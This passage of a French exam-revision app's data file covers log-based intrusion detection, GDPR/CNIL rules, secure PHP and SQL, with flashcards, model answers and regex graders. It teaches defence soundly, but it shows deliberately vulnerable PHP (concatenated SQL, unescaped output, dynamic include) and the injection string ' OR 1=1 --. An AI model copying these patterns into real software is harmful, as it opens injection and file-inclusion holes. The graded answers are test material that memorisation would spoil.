ORDER BY horodatage;</code></pre>
  <p>On lit la chronologie : des échecs depuis <code>203.0.113.7</code>, puis un succès depuis la même IP. C'est une intrusion réussie.</p>
  <p><strong>c) Lister les accès à une donnée personnelle</strong> (obligation RGPD)</p>
  <pre class="codeblock"><code class="lang-sql">SELECT u.login, j.horodatage, j.action
FROM journal j
JOIN utilisateur u ON u.id = j.id_utilisateur
WHERE j.action = 'consultation'
  AND j.details LIKE '%table=client%'
ORDER BY j.horodatage DESC;</code></pre>
  <p><strong>d) Repérer une activité nocturne anormale</strong></p>
  <pre class="codeblock"><code class="lang-sql">SELECT DATE(horodatage) AS jour, COUNT(*) AS nb
FROM journal
WHERE HOUR(horodatage) BETWEEN 1 AND 5
GROUP BY jour
ORDER BY nb DESC;</code></pre>

  <h2>5. La réponse d'investigation en 4 lignes</h2>
  <ol>
    <li><strong>Ce que montrent les logs</strong> : "120 échecs depuis 203.0.113.7 entre 02:10 et 02:47".</li>
    <li><strong>La qualification</strong> : "attaque par force brute ou par dictionnaire".</li>
    <li><strong>Le résultat</strong> : "un succès à 02:48 depuis la même IP, compromission probable".</li>
    <li><strong>La mesure</strong> : verrouillage du compte, blocage de l'IP, réinitialisation du mot de passe, notification CNIL si des données personnelles sont concernées.</li>
  </ol>

  <h2>6. Conservation, rotation, intégrité</h2>
  <ul>
    <li><strong>Rotation</strong> : éviter le remplissage du disque (logrotate, partitionnement par date).</li>
    <li><strong>Conservation</strong> : la CNIL recommande 6 mois pour les logs de connexion, puis purge automatique.</li>
    <li><strong>Intégrité</strong> : les logs ne doivent pas être modifiables par l'attaquant, donc envoi vers un serveur distant ou syslog centralisé.</li>
  </ul>
  <p>Catégorie OWASP à citer : <strong>A09:2021 Security Logging and Monitoring Failures</strong>, absence de journalisation, logs jamais consultés, alertes inexistantes.</p>
  `,
  cards: [
    { id: "j1", q: "Les trois finalités de la journalisation", a: "<ol><li><strong>Détection</strong> d'une attaque en cours.</li><li><strong>Investigation</strong> et reconstitution des faits.</li><li><strong>Traçabilité et conformité</strong>, notamment l'obligation RGPD de prouver qui a accédé aux données personnelles.</li></ol>" },
    { id: "j2", q: "Six champs attendus dans une ligne de log", a: "Horodatage, identifiant utilisateur, adresse IP, action, résultat (succès ou échec), ressource concernée." },
    { id: "j3", q: "Pourquoi <code>VARCHAR(45)</code> pour l'adresse IP ?", a: "C'est la taille maximale d'une adresse IPv6 écrite en texte (39 caractères) plus une marge. Une colonne <code>VARCHAR(15)</code> ne gère que l'IPv4, donc un futur cassé." },
    { id: "j4", q: "Écris la requête qui détecte une force brute sur la dernière heure", a: "<code>SELECT adresse_ip, COUNT(*) AS nb FROM journal WHERE action = 'connexion' AND succes = 0 AND horodatage &gt;= NOW() - INTERVAL 1 HOUR GROUP BY adresse_ip HAVING nb &gt; 5;</code>" },
    { id: "j5", q: "Pourquoi <code>HAVING</code> et pas <code>WHERE</code> pour compter les échecs ?", a: "<code>WHERE</code> filtre les lignes avant le regroupement, donc il ne peut pas porter sur un agrégat. <code>HAVING</code> filtre après <code>GROUP BY</code>, c'est le seul endroit où <code>COUNT(*)</code> est utilisable." },
    { id: "j6", q: "Quelle est la trame de réponse d'une question d'investigation ?", a: "1. Ce que montrent les logs, avec les chiffres. 2. La qualification de l'attaque. 3. Le résultat, donc la compromission ou non. 4. Les mesures prises." },
    { id: "j7", q: "Durée de conservation recommandée pour les logs de connexion ?", a: "Six mois selon la CNIL, puis purge automatique. À citer avec la notion de rotation pour éviter la saturation disque." },
    { id: "j8", q: "Comment garantir l'intégrité des logs face à l'attaquant ?", a: "Les envoyer en temps réel vers un serveur distant ou un syslog centralisé, avec des droits restreints côté machine compromise. Un attaquant qui obtient root local ne doit pas pouvoir réécrire l'historique." }
  ],
  ateliers: [
    {
      id: "at-bruteforce",
      title: "Détecte la force brute",
      lang: "sql",
      prompt: `<p>Table <code>journal(id, horodatage, id_utilisateur, login_saisi, adresse_ip, action, succes, details)</code>.</p>
      <p>Écris la requête qui liste les IP ayant provoqué plus de 5 échecs de connexion sur la dernière heure, du plus actif au moins actif.</p>`,
      starter: `SELECT `,
      model: `SELECT adresse_ip, COUNT(*) AS nb_echecs
FROM journal
WHERE action = 'connexion'
  AND succes = 0
  AND horodatage >= NOW() - INTERVAL 1 HOUR
GROUP BY adresse_ip
HAVING nb_echecs > 5
ORDER BY nb_echecs DESC;`,
      checks: [
        { label: "Compte les lignes avec COUNT(*)", test: /COUNT\s*\(\s*\*\s*\)/i },
        { label: "Filtre action connexion et succes = 0", test: /action\s*=\s*'connexion'[\s\S]*succes\s*=\s*0|succes\s*=\s*0[\s\S]*action\s*=\s*'connexion'/i },
        { label: "Fenêtre d'une heure", test: /INTERVAL\s+1\s+HOUR/i },
        { label: "Groupe par adresse IP", test: /GROUP\s+BY\s+adresse_ip/i },
        { label: "Seuil dans HAVING, pas dans WHERE", test: /HAVING[\s\S]*(>|\bgt\b|&gt;)\s*5|HAVING\s+COUNT/i },
        { label: "Tri décroissant", test: /ORDER\s+BY[\s\S]*DESC/i }
      ]
    },
    {
      id: "at-compromission",
      title: "Rédige la conclusion d'investigation",
      lang: "text",
      prompt: `<p>Les logs montrent : 118 échecs sur le compte <code>jdupont</code> depuis <code>203.0.113.7</code> entre 02:10 et 02:47, puis un succès à 02:48 depuis la même IP, puis 14 consultations de la table <code>client</code> jusqu'à 03:05.</p>
      <p>Rédige la réponse en 4 lignes selon la trame attendue.</p>`,
      starter: `1. Les logs montrent : `,
      model: `1. Les logs montrent : 118 echecs de connexion sur le compte "jdupont" depuis l'IP 203.0.113.7 entre 02:10 et 02:47, puis un succes a 02:48 depuis la meme IP, suivi de 14 consultations de la table client jusqu'a 03:05.

2. Qualification : attaque par force brute (ou par dictionnaire) sur le compte jdupont, suivie d'une authentification reussie.

3. Resultat : compromission du compte tres probable. L'attaquant a eu acces aux donnees personnelles de la table client.

4. Mesures : verrouillage du compte et reinitialisation du mot de passe, blocage de l'IP au pare-feu, revue des droits du compte, et notification a la CNIL sous 72 h si le risque pour les personnes est avere (article 33 du RGPD). Conservation des logs comme preuve.`,
      checks: []
    }
  ]
},

/* ============================== 04 ============================== */
{
  id: "04-rgpd",
  num: "04",
  title: "RGPD & CNIL",
  tag: "7 sujets sur 9",
  hot: true,
  intro: "10 à 20 points en petites questions. La difficulté n'est pas la quantité, c'est la précision du vocabulaire juridique.",
  cours: `
  <h2>1. Donnée personnelle</h2>
  <p>Toute information se rapportant à une <strong>personne physique identifiée ou identifiable</strong>, directement ou indirectement.</p>
  <ul>
    <li>Directement : nom, prénom, photo, numéro de sécurité sociale.</li>
    <li><strong>Indirectement</strong> (le piège) : adresse IP, identifiant de connexion, cookie, plaque d'immatriculation, empreinte matérielle. <strong>Une IP est une donnée personnelle.</strong></li>
    <li>Une donnée <strong>anonymisée</strong> (irréversible) n'est plus personnelle. Une donnée <strong>pseudonymisée</strong> le reste.</li>
  </ul>

  <h2>2. Donnée sensible (article 9)</h2>
  <p>Liste fermée : santé (y compris handicap), origine raciale ou ethnique, opinions politiques, convictions religieuses ou philosophiques, appartenance syndicale, orientation sexuelle, données génétiques et biométriques, infractions et condamnations pénales (article 10).</p>
  <p><strong>Interdites par principe</strong>, sauf exceptions : consentement explicite, obligation légale, médecine.</p>
  <div class="callout callout--warn">
    <span class="callout__label">Piège</span>
    <p>Numéro de téléphone et adresse mail ne sont <strong>pas</strong> sensibles, seulement personnels. Le NIR (numéro de sécurité sociale) est un cas particulier : identifiant unique à protection renforcée.</p>
  </div>

  <h2>3. Les principes de l'article 5</h2>
  <ol>
    <li><strong>Licéité, loyauté, transparence</strong> : base légale et information claire.</li>
    <li><strong>Limitation des finalités</strong> : pas de réutilisation pour autre chose.</li>
    <li><strong>Minimisation</strong> : uniquement le nécessaire.</li>
    <li><strong>Exactitude</strong> : données à jour.</li>
    <li><strong>Limitation de la conservation</strong> : durée définie, puis suppression ou archivage.</li>
    <li><strong>Intégrité et confidentialité</strong> : chiffrement, droits d'accès.</li>
    <li><strong>Accountability</strong> : pouvoir <em>prouver</em> sa conformité.</li>
  </ol>

  <h2>4. Les 6 bases légales</h2>
  <p>Consentement, contrat, obligation légale, sauvegarde des intérêts vitaux, mission d'intérêt public, intérêts légitimes.</p>
  <div class="callout callout--key">
    <span class="callout__label">Nuance qui rapporte</span>
    <p>Le consentement n'est qu'<strong>une</strong> base parmi six. Un site e-commerce n'a pas besoin du consentement pour l'adresse de livraison, la base est l'<strong>exécution du contrat</strong>. "Il faut le consentement pour tout" est faux.</p>
  </div>

  <h2>5. Les droits des personnes</h2>
  <table class="tbl">
    <caption>Six droits à savoir nommer</caption>
    <thead><tr><th>Droit</th><th>Contenu</th></tr></thead>
    <tbody>
      <tr><td><strong>Accès</strong></td><td>Copie des données et des finalités</td></tr>
      <tr><td><strong>Rectification</strong></td><td>Corriger l'inexact</td></tr>
      <tr><td><strong>Effacement</strong></td><td>Droit à l'oubli, sous conditions</td></tr>
      <tr><td><strong>Limitation</strong></td><td>Gel du traitement pendant une vérification</td></tr>
      <tr><td><strong>Opposition</strong></td><td>Refuser un traitement, notamment la prospection</td></tr>
      <tr><td><strong>Portabilité</strong></td><td>Récupérer ses données en format structuré (JSON, CSV)</td></tr>
    </tbody>
  </table>
  <p>Délai de réponse : <strong>1 mois</strong>, prolongeable de 2 mois si le dossier est complexe.</p>

  <h2>6. Durées de conservation (repères CNIL)</h2>
  <table class="tbl">
    <caption>Les chiffres qui tombent en question</caption>
    <thead><tr><th>Contexte</th><th>Durée</th></tr></thead>
    <tbody>
      <tr><td>Comptes clients inactifs</td><td>3 ans après le dernier contact</td></tr>
      <tr><td>Prospects (prospection commerciale)</td><td>3 ans</td></tr>
      <tr><td>Données de paie</td><td>5 ans</td></tr>
      <tr><td>Documents comptables</td><td>10 ans (obligation légale)</td></tr>
      <tr><td>Candidats non retenus</td><td>2 ans maximum</td></tr>
      <tr><td>Logs de connexion</td><td>6 mois</td></tr>
      <tr><td>Vidéosurveillance</td><td>1 mois</td></tr>
    </tbody>
  </table>
  <p>Réponse type : "la durée nécessaire à la finalité, avec un repère CNIL de N, puis purge automatique ou anonymisation".</p>

  <h2>7. Registre des traitements et violation de données</h2>
  <p><strong>Registre (article 30)</strong> : finalité, base légale, catégories de personnes, catégories de données, destinataires, durée, mesures de sécurité. C'est le document à citer pour <em>prouver</em> la conformité.</p>
  <p><strong>Violation de données</strong> :</p>
  <ul>
    <li>Risque pour les droits et libertés : <strong>notification à la CNIL sous 72 h</strong>.</li>
    <li>Risque élevé : <strong>information des personnes concernées</strong> en plus.</li>
    <li>Dans tous les cas : <strong>documenter</strong> la violation, même non notifiée.</li>
  </ul>

  <h2>8. Les acteurs</h2>
  <ul>
    <li><strong>Responsable de traitement</strong> : décide des finalités et des moyens (l'entreprise).</li>
    <li><strong>Sous-traitant</strong> : traite pour le compte du responsable (hébergeur, SaaS).</li>
    <li><strong>DPO</strong> : conseille et contrôle, indépendant.</li>
    <li><strong>CNIL</strong> : autorité de contrôle, sanctions jusqu'à 4 % du chiffre d'affaires mondial ou 20 M€.</li>
  </ul>

  <h2>9. Le réflexe rédactionnel en 3 temps</h2>
  <ol>
    <li><strong>Qualification</strong> : "il s'agit d'une donnée personnelle, sensible, ou d'un traitement".</li>
    <li><strong>Règle</strong> : "le principe de minimisation impose...", "la base légale est...".</li>
    <li><strong>Application au cas</strong> : "donc dans le formulaire, il faut retirer le champ X et ajouter une mention d'information".</li>
  </ol>
  <div class="callout callout--warn">
    <span class="callout__label">Piège majeur</span>
    <p>Obligation légale et bonne pratique ne se confondent pas. Chiffrer les mots de passe est <strong>obligatoire</strong> (article 32). Écrire "c'est recommandé, pas obligatoire" fait perdre le point.</p>
  </div>
  `,
  cards: [
    { id: "r1", q: "Une adresse IP est-elle une donnée personnelle ?", a: "<strong>Oui</strong>, indirectement. Elle permet d'identifier une personne via son fournisseur d'accès. C'est le piège classique de la qualification." },
    { id: "r2", q: "Donne 4 catégories de données sensibles", a: "Santé, origine raciale ou ethnique, opinions politiques, convictions religieuses, appartenance syndicale, orientation sexuelle, données génétiques et biométriques, infractions pénales." },
    { id: "r3", q: "Les 7 principes de l'article 5", a: "Licéité et transparence, limitation des finalités, minimisation, exactitude, limitation de la conservation, intégrité et confidentialité, accountability." },
    { id: "r4", q: "Cite les 6 bases légales", a: "Consentement, contrat, obligation légale, sauvegarde des intérêts vitaux, mission d'intérêt public, intérêts légitimes." },
    { id: "r5", q: "Un e-commerce a-t-il besoin du consentement pour l'adresse de livraison ?", a: "<strong>Non.</strong> La base légale est l'<strong>exécution du contrat</strong>. Le consentement n'est qu'une base parmi six, et exiger du consentement là où le contrat suffit est une erreur de qualification." },
    { id: "r6", q: "Les 6 droits des personnes", a: "Accès, rectification, effacement, limitation, opposition, portabilité. Délai de réponse : 1 mois, prolongeable de 2 mois." },
    { id: "r7", q: "Durées de conservation à retenir", a: "Clients inactifs 3 ans, prospects 3 ans, paie 5 ans, comptabilité 10 ans, candidats 2 ans, logs 6 mois, vidéosurveillance 1 mois." },
    { id: "r8", q: "Délai de notification d'une violation de données ?", a: "<strong>72 h</strong> à la CNIL si la violation est susceptible d'engendrer un risque. Information des personnes en plus si le risque est élevé. Documentation obligatoire dans tous les cas." },
    { id: "r9", q: "Que contient le registre des traitements ?", a: "Finalité, base légale, catégories de personnes et de données, destinataires, durée de conservation, mesures de sécurité. C'est la preuve de l'accountability (article 30)." },
    { id: "r10", q: "Différence entre responsable de traitement et sous-traitant ?", a: "Le responsable décide des finalités et des moyens (l'entreprise). Le sous-traitant traite les données pour son compte, sur instruction (hébergeur, SaaS)." }
  ],
  ateliers: [
    {
      id: "at-rgpd-qualif",
      title: "Qualifie les données d'un formulaire",
      lang: "text",
      prompt: `<p>Un formulaire d'inscription collecte : nom, prénom, adresse mail, téléphone, date de naissance, numéro de sécurité sociale, et le site journalise l'adresse IP de chaque visite.</p>
      <p>Rédige la réponse en 3 temps : qualification, règle, application. Identifie au moins une donnée sensible et une erreur de minimisation.</p>`,
      starter: `1. Qualification : `,
      model: `1. Qualification :
- Nom, prenom, mail, telephone, date de naissance : donnees personnelles (article 4 RGPD).
- Numero de securite sociale (NIR) : donnee personnelle a protection renforcee, identifiant unique.
- Adresse IP journalisee : donnee personnelle, car elle permet une identification indirecte.

2. Regle :
- Principe de minimisation (article 5.1.c) : seules les donnees necessaires a la finalite doivent etre collectees.
- Base legale : execution du contrat pour les donnees de gestion du compte, consentement distinct si prospection.
- Le NIR ne peut etre collecte que si une obligation legale ou une autorisation le prevoit.

3. Application :
- Retirer le champ NIR du formulaire d'inscription s'il n'est pas justifie par une obligation legale.
- Justifier la date de naissance (verification d'age ? sinon la retirer).
- Ajouter une mention d'information : finalite, base legale, duree de conservation, droits, contact DPO.
- Journaliser l'IP uniquement pour la securite, avec une duree de conservation definie (6 mois).`,
      checks: []
    },
    {
      id: "at-rgpd-purge",
      title: "Écris la purge des logs à 6 mois",
      lang: "sql",
      prompt: `<p>La CNIL recommande 6 mois de conservation pour les logs de connexion. Écris la requête qui purge les lignes plus anciennes.</p>
      <p>Un <code>DELETE</code> sans <code>WHERE</code> détruit toute la table : c'est exactement le piège à éviter.</p>`,
      starter: `DELETE `,
      model: `DELETE FROM journal
WHERE horodatage < NOW() - INTERVAL 6 MONTH;`,
      checks: [
        { label: "DELETE FROM journal", test: /DELETE\s+FROM\s+journal/i },
        { label: "Condition WHERE présente", test: /WHERE/i },
        { label: "Antérieur à 6 mois", test: /INTERVAL\s+6\s+MONTH/i },
        { label: "Comparaison stricte sur l'horodatage", test: /horodatage\s*<\s*NOW\s*\(/i }
      ]
    }
  ]
},

/* ============================== 05 ============================== */
{
  id: "05-php",
  num: "05",
  title: "PHP : lire et compléter du code",
  tag: "7 sujets sur 9",
  hot: false,
  intro: "Toujours du PHP simple, procédural ou POO basique, jamais de framework. Savoir repérer les quatre erreurs classiques suffit souvent.",
  cours: `
  <h2>1. Méthode de lecture d'un extrait</h2>
  <ol>
    <li><strong>Entrées utilisateur</strong> : <code>$_POST</code>, <code>$_GET</code>, <code>$_REQUEST</code>, <code>$_COOKIE</code>, <code>$_FILES</code>. Ce sont les points d'entrée d'une attaque.</li>
    <li><strong>Requêtes SQL</strong> : concaténation (vulnérable) ou requête préparée (sûre).</li>
    <li><strong>Sorties</strong> : <code>echo</code>, <code>print</code>, <code>&lt;?= ?&gt;</code>. Non échappées, donc XSS.</li>
    <li><strong>Comparaisons</strong> : <code>==</code> souple contre <code>===</code> stricte.</li>
    <li><strong>Includes dynamiques</strong> : <code>include $_GET['page']</code> vaut LFI (Local File Inclusion).</li>
  </ol>

  <h2>2. Les superglobales</h2>
  <table class="tbl">
    <caption>Contenu et risque principal</caption>
    <thead><tr><th>Variable</th><th>Contenu</th><th>Risque</th></tr></thead>
    <tbody>
      <tr><td><code>$_POST</code></td><td>corps de la requête</td><td>injection SQL, XSS</td></tr>
      <tr><td><code>$_GET</code></td><td>paramètres d'URL</td><td>visible dans l'historique et les logs, injection</td></tr>
      <tr><td><code>$_SESSION</code></td><td>données serveur liées à la session</td><td>fixation de session si mal géré</td></tr>
      <tr><td><code>$_COOKIE</code></td><td>cookies client</td><td>modifiables par l'utilisateur</td></tr>
      <tr><td><code>$_FILES</code></td><td>fichiers uploadés</td><td>upload de webshell</td></tr>
    </tbody>
  </table>
  <p><strong>Règle d'or :</strong> toute donnée venant du client est non fiable jusqu'à validation.</p>

  <h2>3. Valider ou filtrer</h2>
  <ul>
    <li><strong>Valider</strong> : vérifier le format attendu (<code>filter_var($email, FILTER_VALIDATE_EMAIL)</code>). Si non conforme, refus.</li>
    <li><strong>Filtrer ou échapper</strong> : neutraliser pour le contexte de sortie. HTML avec <code>htmlspecialchars($v, ENT_QUOTES, 'UTF-8')</code>, SQL avec une requête préparée, URL avec <code>urlencode()</code>.</li>
  </ul>
  <div class="callout callout--warn">
    <span class="callout__label">Erreur à ne jamais écrire</span>
    <p>"J'utilise <code>addslashes()</code> pour me protéger des injections SQL." C'est incomplet. La réponse attendue est <strong>requête préparée</strong>.</p>
  </div>

  <h2>4. La requête préparée, pattern à connaître</h2>
  <pre class="codeblock"><code class="lang-php">// Connexion PDO
$pdo = new PDO('mysql:host=localhost;dbname=ndv;charset=utf8mb4', $user, $pass, [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false, // vraies requetes preparees cote serveur
]);

// Requete preparee
$stmt = $pdo->prepare('SELECT id, nom FROM client WHERE email = :email');
$stmt->bindValue(':email', $_POST['email'], PDO::PARAM_STR);
$stmt->execute();
$client = $stmt->fetch();

// Variante execute(array)
$stmt = $pdo->prepare('SELECT * FROM client WHERE id = ?');
$stmt->execute([$_GET['id']]);</code></pre>
  <p><strong>Pourquoi ça protège, en une phrase :</strong> le serveur SQL compile la structure de la requête <em>avant</em> de recevoir les valeurs. Les données sont donc toujours traitées comme des valeurs, jamais comme du code SQL. Même <code>' OR 1=1 --</code> reste une chaîne recherchée littéralement.</p>

  <h2>5. Les quatre erreurs classiques</h2>
  <pre class="codeblock"><code class="lang-php">// 1. Concatenation = injection SQL
$sql = "SELECT * FROM client WHERE email = '" . $_POST['email'] . "'";

// 2. XSS : affichage brut
echo "Bonjour " . $_GET['nom'];

// 3. Comparaison souple
if ($_SESSION['role'] == 'admin') { }

// 4. Inclusion dynamique = LFI
include 'pages/' . $_GET['page'] . '.php';</code></pre>
  <ol>
    <li><code>prepare()</code> + <code>bindValue()</code>.</li>
    <li><code>htmlspecialchars($_GET['nom'], ENT_QUOTES, 'UTF-8')</code>.</li>
    <li><code>===</code>.</li>
    <li>Liste blanche : <code>if (in_array($_GET['page'], ['accueil','contact'])) { include ...; }</code>.</li>
  </ol>

  <h2>6. Upload de fichier, dans cet ordre</h2>
  <ol>
    <li>Taille maximale.</li>
    <li>Extension en <strong>liste blanche</strong> (<code>.pdf</code>, <code>.jpg</code>, <code>.png</code>), jamais de liste noire.</li>
    <li>Type MIME réel avec <code>finfo_file</code>, pas celui déclaré par le client.</li>
    <li>Renommage du fichier.</li>
    <li>Stockage hors du dossier web, ou exécution PHP désactivée.</li>
    <li>Nom nettoyé : pas de <code>../</code>, pas de <code>.php</code>.</li>
  </ol>

  <h2>7. Sessions et CSRF</h2>
  <ul>
    <li><code>session_start()</code> avant tout affichage.</li>
    <li><code>session_regenerate_id(true)</code> <strong>après</strong> l'authentification, contre la fixation de session.</li>
    <li>Cookie de session : <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite=Lax ou Strict</code>.</li>
    <li>Déconnexion : <code>session_destroy()</code> plus suppression du cookie.</li>
    <li><strong>CSRF</strong> : jeton stocké en session et envoyé dans chaque formulaire, comparé côté serveur.</li>
  </ul>
  `,
  cards: [
    { id: "p1", q: "Les 5 points d'entrée utilisateur à repérer dans un code PHP", a: "<code>$_POST</code>, <code>$_GET</code>, <code>$_REQUEST</code>, <code>$_COOKIE</code>, <code>$_FILES</code>. Tout ce qui en vient est non fiable jusqu'à validation." },
    { id: "p2", q: "Pourquoi une requête préparée protège-t-elle ?", a: "Le serveur SQL <strong>compile la structure</strong> de la requête avant de recevoir les valeurs. Les données restent des valeurs, jamais du code SQL, même avec <code>' OR 1=1 --</code>." },
    { id: "p3", q: "Que répondre à « j'utilise addslashes contre l'injection SQL » ?", a: "C'est insuffisant et déconseillé. La réponse attendue est la <strong>requête préparée</strong> avec <code>prepare()</code> et <code>bindValue()</code>, ou une liste blanche de validation." },
    { id: "p4", q: "Comment échapper une sortie HTML ?", a: "<code>htmlspecialchars($valeur, ENT_QUOTES, 'UTF-8')</code>. Le troisième paramètre évite les problèmes d'encodage, le second échappe aussi les apostrophes et guillemets." },
    { id: "p5", q: "Pourquoi <code>==</code> est-il dangereux pour un rôle ?", a: "La comparaison souple applique des conversions de type. <code>if ($_SESSION['role'] == 'admin')</code> peut devenir vrai avec des valeurs inattendues. On utilise <code>===</code>." },
    { id: "p6", q: "Qu'est-ce qu'une LFI et comment la bloquer ?", a: "Local File Inclusion : <code>include 'pages/' . $_GET['page'] . '.php'</code> laisse charger un fichier arbitraire. Défense : liste blanche avec <code>in_array()</code>, jamais de concaténation directe." },
    { id: "p7", q: "Les 6 contrôles d'un upload de fichier", a: "Taille, extension en liste blanche, type MIME réel via <code>finfo_file</code>, renommage, stockage hors dossier web, nettoyage du nom (pas de <code>../</code> ni de <code>.php</code>)." },
    { id: "p8", q: "Comment prévenir la fixation de session ?", a: "<code>session_regenerate_id(true)</code> juste après l'authentification, plus un cookie <code>HttpOnly</code>, <code>Secure</code> et <code>SameSite</code>." },
    { id: "p9", q: "Quel est le principe d'une défense CSRF ?", a: "Un jeton anti-CSRF généré côté serveur, stocké en session et inséré dans chaque formulaire. À la soumission, on compare. Un site tiers ne peut pas deviner le jeton." }
  ],
  ateliers: [
    {
      id: "at-php-prepare",
      title: "Réécris la requête en toute sécurité",
      lang: "php",
      prompt: `<p>Code vulnérable :</p>
      <pre class="codeblock"><code class="lang-php">$email = $_POST['email'];
$sql = "SELECT id, nom FROM client WHERE email = '" . $email . "'";
$result = $pdo->query($sql);</code></pre>
      <p>Réécris-le avec une requête préparée PDO et <code>bindValue</code>. Le résultat doit être un tableau associatif.</p>`,
      starter: `$email = $_POST['email'];

`,
      model: `$email = $_POST['email'];

$stmt = $pdo->prepare('SELECT id, nom FROM client WHERE email = :email');
$stmt->bindValue(':email', $email, PDO::PARAM_STR);
$stmt->execute();

$client = $stmt->fetch();          // PDO::FETCH_ASSOC par defaut si configure
// ou : $stmt->fetch(PDO::FETCH_ASSOC);

// Variante courte, equivalente :
// $stmt = $pdo->prepare('SELECT id, nom FROM client WHERE email = ?');
// $stmt->execute([$email]);`,
      checks: [
        { label: "Utilise prepare()", test: /\$pdo\s*->\s*prepare\s*\(/i },
        { label: "Aucune concaténation de variable dans le SQL", test: /^(?![\s\S]*(SELECT|WHERE)[^;]*["'][^;]*\.\s*\$)/i },
        { label: "Marqueur nommé ou positionnel", test: /:(email|id)\b|\?\s*['"]/i },
        { label: "Lie la valeur avec bindValue ou execute(array)", test: /bindValue\s*\(|bindParam\s*\(|execute\s*\(\s*\[/i },
        { label: "Récupère le résultat avec fetch()", test: /fetch\s*\(/i }
      ]
    },
    {
      id: "at-php-csrf-session",
      title: "Sécurise la connexion : session et redirection",
      lang: "php",
      prompt: `<p>Après un <code>password_verify</code> réussi, écris les trois lignes qui sécurisent la session, puis la redirection vers <code>dashboard.php</code>.</p>
      <p>Pense à l'identifiant de session, à la variable de session, et à sortir proprement avec <code>exit</code>.</p>`,
      starter: `if (password_verify($mdpSaisi, $hashStocke)) {

`,
      model: `if (password_verify($mdpSaisi, $hashStocke)) {

    // 1. Nouvel identifiant de session : previent la fixation de session
    session_regenerate_id(true);

    // 2. On stocke l'identite côté serveur, jamais le mot de passe
    $_SESSION['id_utilisateur'] = $utilisateur['id'];
    $_SESSION['role']           = $utilisateur['role'];

    // 3. Redirection puis arret du script
    header('Location: dashboard.php');
    exit;
}`,
      checks: [
        { label: "Régénère l'identifiant de session", test: /session_regenerate_id\s*\(\s*true\s*\)/i },
        { label: "Écrit l'identité dans \$_SESSION", test: /\$_SESSION\s*\[/i },
        { label: "Ne stocke pas le mot de passe en session", test: /^(?![\s\S]*\$_SESSION\s*\[\s*['"](?:mdp|password|pass))/i },
        { label: "Redirige avec header Location", test: /header\s*\(\s*['"]Location:/i },
        { label: "Termine avec exit (pas seulement header)", test: /\bexit\b|die\s*\(/i }
      ]
    },
    {
      id: "at-php-lfi",
      title: "Corrige l'inclusion dynamique",
      lang: "php",
      prompt: `<p>Code vulnérable : <code>include 'pages/' . $_GET['page'] . '.php';</code></p>
      <p>Corrige-le avec une liste blanche, et prévois un comportement par défaut si la page demandée n'existe pas.</p>`,
      starter: `$page = $_GET['page'] ?? 'accueil';

`,
      model: `$page = $_GET['page'] ?? 'accueil';

$pagesAutorisees = ['accueil', 'contact', 'mentions'];

if (in_array($page, $pagesAutorisees, true)) {
    include 'pages/' . $page . '.php';
} else {
    http_response_code(404);
    include 'pages/404.php';
}`,
      checks: [
        { label: "Liste blanche de pages autorisées", test: /(pagesAutorisees|\$autorisees|allowed|\$whitelist)\s*=\s*\[/i },
        { label: "Contrôle avec in_array", test: /in_array\s*\(/i },
        { label: "Comparaison stricte (3e argument true ou ===", test: /in_array\s*\([^)]*,\s*true\s*\)|===/i },
        { label: "Inclusion conditionnée, pas concaténée directement", test: /if\s*\([^)]*in_array|switch\s*\(\s*\$page/i }
      ]
    }
  ]
},

/* ============================== 06 ============================== */
{
  id: "06-sql",
  num: "06",
  title: "SQL & SGBD",
  tag: "9 sujets sur 9",
  hot: true,
  intro: "La matière la plus sûre de l'épreuve. Jointures, agrégats et ALTER TABLE : si tu les écris sans hésiter, tu sécurises 20 points.",
  cours: `
  <h2>1. Vocabulaire exact</h2>
  <ul>
    <li><strong>SGBD</strong> : système de gestion de base de données (le logiciel : MySQL, MariaDB, PostgreSQL).</li>
    <li><strong>Base</strong> : ensemble structuré de tables.</li>
    <li><strong>Table</strong> : lignes (enregistrements, tuples) et colonnes (attributs, champs).</li>
    <li><strong>Clé primaire</strong> : identifie une ligne de façon unique, jamais NULL.</li>
    <li><strong>Clé étrangère</strong> : référence la clé primaire d'une autre table, assure l'intégrité référentielle.</li>
    <li><strong>Contraintes</strong> : <code>NOT NULL</code>, <code>UNIQUE</code>, <code>CHECK</code>, <code>DEFAULT</code>.</li>
  </ul>

  <h2>2. Types de données</h2>
  <table class="tbl">
    <caption>Le bon type pour le bon besoin</caption>
    <thead><tr><th>Besoin</th><th>Type</th><th>Remarque</th></tr></thead>
    <tbody>
      <tr><td>Identifiant</td><td><code>INT AUTO_INCREMENT</code></td><td><code>BIGINT</code> si gros volume</td></tr>
      <tr><td>Chaîne courte</td><td><code>VARCHAR(n)</code></td><td>n = taille réelle maximum</td></tr>
      <tr><td>Hash de mot de passe</td><td><code>VARCHAR(255)</code></td><td>60 pour bcrypt, avec marge</td></tr>
      <tr><td>Texte long</td><td><code>TEXT</code></td><td>notes, descriptions</td></tr>
      <tr><td>Date</td><td><code>DATE</code></td><td></td></tr>
      <tr><td>Date et heure</td><td><code>DATETIME</code> ou <code>TIMESTAMP</code></td><td><code>TIMESTAMP</code> gère le fuseau</td></tr>
      <tr><td>Booléen</td><td><code>TINYINT(1)</code></td><td>MySQL n'a pas de vrai BOOLEAN</td></tr>
      <tr><td>Montant</td><td><code>DECIMAL(10,2)</code></td><td>jamais <code>FLOAT</code> pour de l'argent</td></tr>
      <tr><td>Donnée chiffrée</td><td><code>VARBINARY(255)</code></td><td>sortie de <code>AES_ENCRYPT</code></td></tr>
    </tbody>
  </table>
  <div class="callout callout--warn">
    <span class="callout__label">Piège du FLOAT</span>
    <p><code>FLOAT</code> et <code>DOUBLE</code> stockent en binaire approximatif : <code>0.1 + 0.2 != 0.3</code>. Pour des montants, <code>DECIMAL</code> est obligatoire.</p>
  </div>

  <h2>3. CREATE TABLE et clés étrangères</h2>
  <pre class="codeblock"><code class="lang-sql">CREATE TABLE client (
  id        INT AUTO_INCREMENT PRIMARY KEY,
  nom       VARCHAR(80)  NOT NULL,
  email     VARCHAR(150) NOT NULL UNIQUE,
  mdp_hash  VARCHAR(255) NOT NULL,
  id_pays   INT          NULL,
  cree_le   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
  CONSTRAINT fk_client_pays
    FOREIGN KEY (id_pays) REFERENCES pays(id)
    ON DELETE SET NULL ON UPDATE CASCADE
);</code></pre>
  <table class="tbl">
    <caption>Options de clé étrangère</caption>
